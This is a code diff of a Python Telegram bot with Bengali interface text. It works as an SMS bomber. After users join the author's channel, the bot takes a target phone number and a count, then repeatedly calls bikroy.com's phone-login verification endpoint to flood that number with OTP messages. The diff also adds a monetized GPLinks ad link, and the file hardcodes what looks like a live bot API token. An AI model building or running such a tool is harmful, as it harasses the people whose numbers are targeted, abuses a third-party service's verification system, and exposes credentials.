@@ -3,87 +3,62 @@ import requests
 import time
 from telebot import types
 
-# ১. সেটিংস ও টোকেন
+# আপনার সেটিংস
 API_TOKEN = '8678067992:AAEDkPkmtuz86YnrMJcnIVcp19tL52tkyRk'
 CHANNEL_USERNAME = '@developer_of_maruf' 
-AD_TEXT = "\n\n🚀 Join our channel for more updates!"
+# নিচের লিংকের জায়গায় আপনার GPLinks থেকে পাওয়া শর্ট লিংকটি বসাবেন
+GPLINK_AD = "https://gplinks.co/YourLink" 
 
 bot = telebot.TeleBot(API_TOKEN)
 user_data = {}
 
-# মেম্বারশিপ চেক করার ফাংশন
 def check_join(chat_id):
     try:
         status = bot.get_chat_member(CHANNEL_USERNAME, chat_id).status
         return status in ['member', 'administrator', 'creator']
-    except Exception:
-        return False
+    except: return False
 
-# ২. /start কমান্ড
 @bot.message_handler(commands=['start'])
 def welcome(message):
-    chat_id = message.chat.id
-    
-    if check_join(chat_id):
-        msg = bot.send_message(chat_id, "✅ ভেরিফিকেশন সফল!\nএখন SMS পাঠাতে আপনার নাম্বারটি লিখুন:" + AD_TEXT)
+    if check_join(message.chat.id):
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("💰 টাকা ইনকাম করুন (ক্লিক)", url=GPLINK_AD))
+        msg = bot.send_message(message.chat.id, "✅ ভেরিফিকেশন সফল!\nএখন SMS পাঠাতে আপনার নাম্বারটি লিখুন:", reply_markup=markup)
         bot.register_next_step_handler(msg, get_number)
     else:
         markup = types.InlineKeyboardMarkup()
-        btn_join = types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/developer_of_maruf")
-        btn_done = types.InlineKeyboardButton("🔄 Verify / Done", callback_data="verify")
-        markup.add(btn_join)
-        markup.add(btn_done)
-        
-        bot.send_message(chat_id, "❌ আপনি এখনো আমাদের চ্যানেলে জয়েন করেননি!\n\nবোটটি ব্যবহার করতে প্রথমে জয়েন করুন, তারপর ভেরিফাই ক্লিক করুন।", reply_markup=markup)
+        markup.add(types.InlineKeyboardButton("📢 Join Channel", url="https://t.me/developer_of_maruf"))
+        markup.add(types.InlineKeyboardButton("🔄 Verify Done", callback_data="verify"))
+        bot.send_message(message.chat.id, "❌ বোটটি ব্যবহার করতে আগে চ্যানেলে জয়েন করুন!", reply_markup=markup)
 
-# ৩. ভেরিফাই বাটন হ্যান্ডলার
 @bot.callback_query_handler(func=lambda call: call.data == "verify")
 def verify(call):
-    chat_id = call.message.chat.id
-    if check_join(chat_id):
-        bot.delete_message(chat_id, call.message.message_id)
-        msg = bot.send_message(chat_id, "✅ ভেরিফিকেশন সফল!\nএখন SMS পাঠাতে আপনার নাম্বারটি লিখুন:" + AD_TEXT)
-        bot.register_next_step_handler(msg, get_number)
+    if check_join(call.message.chat.id):
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+        bot.send_message(call.message.chat.id, "✅ সফল! এখন আপনার নাম্বারটি লিখুন:")
+        bot.register_next_step_handler(call.message, get_number)
     else:
-        bot.answer_callback_query(call.id, "❌ আপনি আমাদের চ্যানেলে জয়েন হননি! বোটটি ব্যবহার করতে অবশ্যই আমাদের চ্যানেলে জয়েন হতে হবে।", show_alert=True)
+        bot.answer_callback_query(call.id, "❌ আপনি এখনো জয়েন হননি!", show_alert=True)
 
-# ৪. নাম্বার ইনপুট নেওয়া
 def get_number(message):
-    number = message.text
-    if not number or not number.isdigit() or len(number) < 11:
-        msg = bot.reply_to(message, "❌ ভুল নাম্বার! সঠিক ১১ ডিজিটের নাম্বার দিন:")
+    if not message.text or not message.text.isdigit() or len(message.text) < 11:
+        msg = bot.reply_to(message, "❌ সঠিক ১১ ডিজিটের নাম্বার দিন:")
         bot.register_next_step_handler(msg, get_number)
         return
-        
-    user_data[message.chat.id] = {'number': number}
-    msg = bot.reply_to(message, "🔢 কতটি SMS পাঠাতে চান (Amount) লিখুন:" + AD_TEXT)
+    user_data[message.chat.id] = {'number': message.text}
+    msg = bot.reply_to(message, "🔢 কতটি SMS পাঠাতে চান?")
     bot.register_next_step_handler(msg, get_amount)
 
-# ৫. এমাউন্ট নিয়ে SMS পাঠানো
 def get_amount(message):
     try:
         amount = int(message.text)
-        chat_id = message.chat.id
-        number = user_data[chat_id]['number']
-        
-        bot.send_message(chat_id, f"🚀 {number} নাম্বারে {amount}টি SMS পাঠানো শুরু হচ্ছে..." + AD_TEXT)
-
-        api = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}"
-
+        num = user_data[message.chat.id]['number']
+        bot.send_message(message.chat.id, f"🚀 {num} এ {amount}টি SMS যাচ্ছে...\n\n📢 স্পন্সর অফার: {GPLINK_AD}")
         for i in range(amount):
-            requests.get(api, timeout=5)
+            requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", timeout=5)
+        bot.send_message(message.chat.id, "✅ কাজ শেষ! আবার পাঠাতে /start দিন।")
+    except: pass
 
-        bot.send_message(chat_id, f"✅ অভিনন্দন! সফলভাবে {amount}টি SMS পাঠানো হয়েছে।\n\nআবার নতুন করে পাঠাতে /start লিখুন।" + AD_TEXT)
-        
-    except Exception as e:
-        msg = bot.reply_to(message, "⚠️ ভুল হয়েছে! শুধু সংখ্যা লিখুন (যেমন: ১০):")
-        bot.register_next_step_handler(msg, get_amount)
-
-# বোট সচল রাখার লুপ
 if __name__ == "__main__":
-    print("বোট সচল আছে...")
-    while True:
-        try:
-            bot.polling(none_stop=True, interval=0, timeout=20)
-        except Exception as e:
-            time.sleep(5)
+    print("বোট চালু হয়েছে...")
+    bot.infinity_polling()
